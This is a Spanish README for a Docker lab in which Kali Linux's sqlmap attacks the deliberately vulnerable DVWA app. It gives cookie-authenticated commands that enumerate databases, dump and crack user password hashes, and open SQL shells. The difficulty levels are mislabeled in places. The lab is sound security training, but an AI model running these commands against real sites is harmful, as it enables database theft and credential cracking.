
# DVWA y Kali Linux con SQLMap - Docker Setup

Este proyecto utiliza Docker Compose para levantar dos servicios:

1.  **DVWA (Damn Vulnerable Web Application)**: Una aplicación web vulnerable para pruebas de seguridad.
2.  **Kali Linux**: Un sistema operativo enfocado en pruebas de penetración, que puedes usar para atacar DVWA usando herramientas como SQLMap.

## Requisitos

Asegúrate de tener Docker y Docker Compose instalados en tu máquina antes de proceder. Si no los tienes, sigue estos pasos:

- [Instalar Docker](https://docs.docker.com/get-docker/)
- [Instalar Docker Compose](https://docs.docker.com/compose/install/)

## Instrucciones de uso

### 1. Levantar los servicios

Para levantar ambos servicios (DVWA y Kali Linux), simplemente ejecuta:

```bash
docker-compose  up  -d
```

Esto iniciará los dos contenedores:
-  **DVWA** estará disponible en [http://localhost](http://localhost)
-  **Kali Linux** estará disponible como un contenedor interactivo donde puedes correr comandos.
### 2. Acceder al contenedor de Kali Linux

Para ingresar al contenedor de Kali Linux, utiliza el siguiente comando:

```bash
docker  exec  -it  kali  /bin/bash
```

Esto abrirá una terminal dentro del contenedor de Kali.

### 3. Acceder a DVWA

Abre tu navegador web y visita [http://localhost](http://localhost) para acceder a la interfaz de DVWA. Puedes usar el nombre de usuario `admin` y la contraseña `password` para iniciar sesión. Una vez dentro tiene que presionar el botón para crear la base de datos

### 4. Usar SQLMap

Para usar sqlmap debe usar el comando que vimos al inicio para abrir el contenedor de kali linux una vez dentro el sqlmap ya está instalado por lo que solo necesitan usar un comando como el siguiente para acceder a sqlmap. Pero para poder atacar el sitio, la seguridad del mismo pide tener una sesión por lo que necesitamos unas cookies que sirvan como credenciales.

```bash
sqlmap  -u  "http://dvwa/login.php"  --forms  --batch
```

El único problema en este punto es que la pagina de dvwa, como muchas otras, pide tener una sesión iniciada para usar sus servicios, ósea sus métodos no son públicos, necesitan credenciales. Lo bueno es que estas credenciales están en las cookies por lo que podemos tomarlas de estas en el modo desarrollador.

### 5. Obtener las cookies

Para obtener las credenciales los pasos son:
- Iniciar sesión en dvwa, puede ser con admin/password
- Entrar en modo desarrollador del sitio web
- Entre el menu, ir a storage y después a cookies
- Entre las cookies de localhost hay una llamada "PHPSESSID" y otra llamada "security" copian el nombre y el valor para usarla en el comando de la siguiente forma. La primera es la credencial de sesion que nos da permisos para usar las urls, la segunda credencial representa el nivel de dificultad de la pagina [low | medium | hard | impossible].

```bash
sqlmap  -u  "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#"  --cookie="PHPSESSID=3jnfo12s7lim6st1vflr6lc5; security=low"  --dbs
```

## Lista de etiquetas en sqlmap

| Comando          | Descripción                                                                                                   |
|------------------|---------------------------------------------------------------------------------------------------------------|
| `-a`, `--all`    | Obtiene toda la información de la base de datos.                                                              |
| `-b`, `--banner` | Obtiene el banner, información de la base de datos como versión, proveedor, etc.                              |
| `--current-user` | Muestra el usuario con el que la página hace las peticiones.                                                  |
| `--current-db`   | Muestra la base de datos en uso.                                                                              |
| `--passwords`    | Enumera los hashes de las contraseñas de usuarios de la DB (se requiere permisos adecuados).                  |
| `--dbs`          | Enumera todas las bases de datos disponibles en el sistema.                                                   |
| `--tables`       | Muestra todas las tablas de la base de datos (solo el nombre).                                                |
| `--columns`      | Muestra todas las columnas de la base de datos (incluye tabla, nombre, tipo, tamaño).                         |
| `--schema`       | Muestra todo el esquema de la base de datos.                                                                  |
| `--dump`         | Extrae los datos de una tabla o de la base de datos completa si no se selecciona una específica.              |
| `--dump-all`     | Extrae toda la información del sistema.                                                                       |
| `--forms`        | Detecta formularios HTML y busca vulnerabilidades.                                                            |
| `--batch`        | Automatiza el análisis dejando todas las preguntas por defecto.                                               |
| `--is-dba`       | Verifica si el usuario tiene permisos de DBA.                                                                 |
| `-D`             | Selecciona una base de datos.                                                                                 |
| `-T`             | Selecciona una tabla.                                                                                         |
| `-C`             | Selecciona una columna.                                                                                       |
| `--sql-shell`    | Abre una consola SQL.                                                                                         |
| `--os-shell`     | Abre la terminal de la computadora que gestiona la base de datos (depende de los roles del usuario).          |
| `-u`, `-url`     | Especifica la URL objetivo para realizar las consultas.                                                       |
| `--cookies`      | Establece cookies para la sesión, útil para autenticación en sitios web.                                      |


# Ejemplos de ataques con sqlmap en imposible:

  Incluso con sqlmap vulnerar el DVWA en imposible es una tarea complicada, ya que el DVWA asigna un token por búsqueda de ID. Afortunadamente podemos aprovecharnos de la etiqueta  `--forms` esta buscara en todas las inputs del html y hará peticiones buscando vulnerabilidades y tiene la capacidad de tomar esos tokens que se generan automáticamente al realizar la búsqueda para nosotros realizar  un ataque.

## Consideraciones
- Ya que vamos a ejecutar todos los ataques con la etiqueta `--forms` la url que vamos a usar es: http://localhost/vulnerabilities/sqli/
- Recordar en la etiqueta cookies setear la dificultad en `impossible`

## Ataques:

**Obtener vulnerabilidades automáticamente:**
```bash
sqlmap -u "http://dvwa/vulnerabilities/sqli/" \
       --cookie="PHPSESSID=lr9lv4r0bjfaphhihf2rfbt857; security=hard" \
       --forms --batch
```

resultado --> https://app.warp.dev/block/HH5VScHmqmUluzyl07d5eo

**Obtener el nombre de las bases de datos disponibles:**
```bash
sqlmap -u "http://dvwa/vulnerabilities/sqli/" \
       --cookie="PHPSESSID=lr9lv4r0bjfaphhihf2rfbt857; security=hard" \
       --forms --batch --dbs
```

resultado --> https://app.warp.dev/block/AGMLqov05s4LcfdVBNlm6y

**Obtener las tablas de una base de datos seleccionada:**
```bash
sqlmap -u "http://dvwa/vulnerabilities/sqli/" \
       --cookie="PHPSESSID=lr9lv4r0bjfaphhihf2rfbt857; security=hard" \
       --forms --batch -D dvwa --tables
```

resultado --> https://app.warp.dev/block/ZrBM8KcWEb1UBHIzNnU7p9

**Obtener las columnas de una tabla seleccionada:**
```bash
sqlmap -u "http://dvwa/vulnerabilities/sqli/" \
       --cookie="PHPSESSID=lr9lv4r0bjfaphhihf2rfbt857; security=hard" \
       --forms --batch -D dvwa -T users --columns
```

resultado --> https://app.warp.dev/block/EmJbAKfRC60zqRXI24Ix0S

**Obtener los datos de una tabla y hacer el intento de obtener sus contraseñas:**
```bash
sqlmap -u "http://dvwa/vulnerabilities/sqli/" \
       --cookie="PHPSESSID=b53d42u3udinb2g35103bq62u2; security=hard" \
       --forms -D dvwa -T users -C user,password --dump
```

resultado --> https://app.warp.dev/block/py4Kjp09G3IxaE141ZD95W

En este paso es importante quitar la etiqueta `--batch` porque en el prompt `do  you  want  to  crack  them  via  a  dictionary-based  attack?  [y/N/q]` hay que responder `y` para que des-encripte las contraseñas. Fuera de esto todo se queda por defecto.

**Hacer un ataque directo a todos los datos de la base de datos en uso:**
```bash
sqlmap -u "http://dvwa/vulnerabilities/sqli/" \
       --cookie="PHPSESSID=b53d42u3udinb2g35103bq62u2; security=hard" \
       --forms --batch --dump
```

resultado --> https://app.warp.dev/block/55jSoYodUFPGED4Doh3JiY

En este caso se dejo la etiqueta `--batch` para demostrar que si se usa para obtener contraseñas no las des-encripta.


**Saber si el usuario que  se utiliza para hacer las consultas es DBA:**
```bash
sqlmap -u "http://dvwa/vulnerabilities/sqli/" \
       --cookie="PHPSESSID=b53d42u3udinb2g35103bq62u2; security=hard" \
       --forms --is-dba --batch
```

resultado --> https://app.warp.dev/block/hgQVvrFVjzVKiMTp17YcsE

**Obtener usuarios y contraseñas de los usuarios de la base de datos (solo sirve si el usuario usado tiene suficientes permisos):**
```bash
sqlmap -u "http://dvwa/vulnerabilities/sqli/" \
       --cookie="PHPSESSID=b53d42u3udinb2g35103bq62u2; security=hard" \
       --forms --users --passwords --batch
```

resultado --> https://app.warp.dev/block/N1PMv7OXYwuOz20YeByc9F

**Abrir una consola de SQL en nuestra maquina:**
```bash
sqlmap -u "http://dvwa/vulnerabilities/sqli/" \
       --cookie="PHPSESSID=b53d42u3udinb2g35103bq62u2; security=hard" \
       --forms --sql-shell --batch
```

resultado --> https://app.warp.dev/block/UzcNXiIx9xjRRvv0xsKrYc

## Apagar los servicios

Cuando hayas terminado, puedes detener los contenedores con el siguiente comando:

```bash
docker-compose  down
```

Esto apagará y eliminará los contenedores.
